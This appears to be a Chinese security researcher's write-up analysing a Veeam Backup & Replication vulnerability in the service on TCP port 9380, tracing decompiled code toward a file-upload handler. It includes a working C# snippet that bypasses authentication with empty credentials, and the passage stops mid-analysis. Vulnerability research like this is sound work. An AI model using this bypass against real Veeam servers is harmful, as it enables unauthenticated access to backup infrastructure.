@@ -1,0 +1,156 @@
+**作者：Y4er**  
+**原文链接：**
+看推特又爆了cve，感觉挺牛逼的洞，于是分析一手。
+## 官方公告
+> The Veeam Distribution Service (TCP 9380 by default) allows unauthenticated
+> users to access internal API functions. A remote attacker may send input to
+> the internal API which may lead to uploading and executing of malicious
+> code.
+漏洞描述说是tcp9380服务出了问题，直接分析就行了。
+## 环境
+[VeeamBackup &
+Replication_11.0.1.1261_20211211.iso](https://download2.veeam.com/VBR/v11/VeeamBackup&Replication_11.0.1.1261_20211211.iso
+"VeeamBackup & Replication_11.0.1.1261_20211211.iso")
+还有补丁包[VeeamBackup&Replication_11.0.1.1261_20220302.zip](https://download2.veeam.com/VBR/v11/VeeamBackup&Replication_11.0.1.1261_20220302.zip
+"VeeamBackup&Replication_11.0.1.1261_20220302.zip")的下载地址
+搭建过程就不说了，参考[官方文档](https://helpcenter.veeam.com/docs/backup/vsphere/install_vbr.html?ver=110
+"官方文档")
+**需要注意的是1和2都需要装**
+## 分析
+在我分析的时候遇到了几个问题，最关键的就是怎么构造参数通过tcp传递给服务器，踩了很多坑，接下来的分析我分为三部分写。
+### 寻找漏洞点
+先找到9380端口占用的程序
+定位到`Veeam.Backup.Agent.ConfigurationService.exe`
+发现是个服务程序
+在OnStart中监听两个端口
+_negotiateServer监听9380 _sslServer监听9381，接下来是tcp编程常见的写法，开线程传递委托，最终处理函数为
+`Veeam.Backup.ServiceLib.CInvokerServer.HandleTcpRequest(object)`，在这个函数中有鉴权处理
+跟入
+`Veeam.Backup.ServiceLib.CForeignInvokerNegotiateAuthenticator.Authenticate(Socket)`
+这个地方的鉴权可以被绕过，使用空账号密码来连接即可，绕过代码如下
+    internal class Program
+    {
+        static TcpClient client = null;
+        static void Main(string[] args)
+        {
+            IPAddress ipAddress = IPAddress.Parse("172.16.16.76");
+            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 9380);
+            client = new TcpClient();
+            client.Connect(remoteEP);
+            Console.WriteLine("Client connected to {0}.", remoteEP.ToString());
+            NetworkStream clientStream = client.GetStream();
+            NegotiateStream authStream = new NegotiateStream(clientStream, false);
+            try
+            {
+                NetworkCredential netcred = new NetworkCredential("", "");
+                authStream.AuthenticateAsClient(netcred, "", ProtectionLevel.EncryptAndSign, TokenImpersonationLevel.Identification);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
+            finally
+            {
+                authStream.Close();
+            }
+            Console.ReadKey();
+        }
+    }
+dnspy附加进程调试之后，发现成功绕过鉴权返回result
+接着跟入又是tcp编程的写法，异步callback，关键函数在`Veeam.Backup.ServiceLib.CInvokerServer.ExecThreadProc(object)`
+tcp压缩数据流通过ReadCompressedString读出字符串，然后通过`CForeignInvokerParams.GetContext(text)`获取上下文，然后交由`this.DoExecute(context,
+cconnectionState)`进行分发调用。
+在GetContext函数中
+    public static CSpecDeserializationContext GetContext(string xml)
+    {
+        return new CSpecDeserializationContext(xml);
+    }
+将字符串交给CSpecDeserializationContext构造函数
+说明我们向服务端发送的tcp数据流应该是一个压缩之后的xml字符串，需要正确构造xml。那么需要什么样格式呢？
+先来看DoExecute()
+GetOrCreateExecuter()是拿到被执行者Executer
+根据传入参数不同分别返回三个不同的Executer
+  1. CInvokerServerRetryExecuter 重试Executer
+  2. CInvokerServerAsyncExecuter 异步Executer
+  3. CInvokerServerSyncExecuter 同步Executer
+获取到Executer之后进入Executer的Execute()函数，Execute()来自于IInvokerServerExecuter接口，分析实现类刚好就是上面的三个类
+在CInvokerServerSyncExecuter同步执行类的Execute函数中，调用this._specExecuter.Execute(context,
+state)继续往下分发
+而_specExecuter字段的类型也是一个接口IInvokerServerSpecExecuter，有三个实现类。
+在`Veeam.Backup.EpAgent.ConfigurationService.CEpAgentConfigurationServiceExecuter.Execute(CSpecDeserializationContext,
+CConnectionState)`中可以很敏感的看到upload相关的东西
+    private string Execute(CForeignInvokerParams invokerParams, string certificateThumbprint, string remoteHostAddress)
+    {
+        CConfigurationServiceBaseSpec cconfigurationServiceBaseSpec = (CConfigurationServiceBaseSpec)invokerParams.Spec;
+        CInputXmlData cinputXmlData = new CInputXmlData("RIResponse");
+        cinputXmlData.SetBool("PersistentConnection", true);
+        string text = ((EConfigurationServiceMethod)cconfigurationServiceBaseSpec.Method).ToString();
+        Log.Message("Command '{0}' ({1})", new object[]
+        {
+            text,
+            remoteHostAddress
+        });
+        EConfigurationServiceMethod method = (EConfigurationServiceMethod)cconfigurationServiceBaseSpec.Method;
+        switch (method)
+        {
+        ........省略.......
+        case EConfigurationServiceMethod.UploadManagerGetFolders:
+            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerGetFolders((CConfigurationServiceUploadManagerGetFolders)cconfigurationServiceBaseSpec, cinputXmlData);
+            goto IL_1B1;
+        case EConfigurationServiceMethod.UploadManagerIsFileInCache:
+            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerIsFileInCache((CConfigurationServiceUploadManagerIsFileInCache)cconfigurationServiceBaseSpec, cinputXmlData);
+            goto IL_1B1;
+        case EConfigurationServiceMethod.UploadManagerPerformUpload:
+            CEpAgentConfigurationServiceExecuter.ExecuteUploadManagerPerformUpload((CConfigurationServiceUploadManagerPerformUpload)cconfigurationServiceBaseSpec, cinputXmlData);
+            goto IL_1B1;
+        default:
+            if (method == EConfigurationServiceMethod.Disconnect)
+            {
+                CEpAgentConfigurationServiceExecuter.ExecuteDisconnect();
+                goto IL_1B1;
+            }
+            break;
+        }
+        throw new Exception("Failed to process command '" + text + "': Executer not implemented");
+        IL_1B1:
+        return cinputXmlData.Serial();
+    }
+其中case到UploadManagerPerformUpload时，进入ExecuteUploadManagerPerformUpload函数处理文件上传
+    private static void ExecuteUploadManagerPerformUpload(CConfigurationServiceUploadManagerPerformUpload spec, CInputXmlData response)
+    {
+        string host = spec.Host;
+        if (!File.Exists(spec.FileProxyPath))
+        {
+            throw new Exception(string.Concat(new string[]
+            {
+                "Failed to upload file '",
+                spec.FileProxyPath,
+                "' to host ",
+                host,
+                ": File doesn't exist in cache"
+            }));
+        }
+        string value;
+        if (spec.IsWindows)
+        {
+            if (spec.IsFix)
+            {
+                value = CEpAgentConfigurationServiceExecuter.UploadWindowsFix(spec);
+            }
+            else
+            {
+                if (!spec.IsPackage)
+                {
+                    throw new Exception(string.Concat(new string[]
+                    {
+                        "Fatal logic error: Failed to upload file '",
+                        spec.FileProxyPath,
+                        "' to host ",
+                        host,
+                        ": Unexpected upload task type"
+                    }));
+                }
+                value = CEpAgentConfigurationServiceExecuter.UploadWindowsPackage(spec);
+            }
+        }
+        else
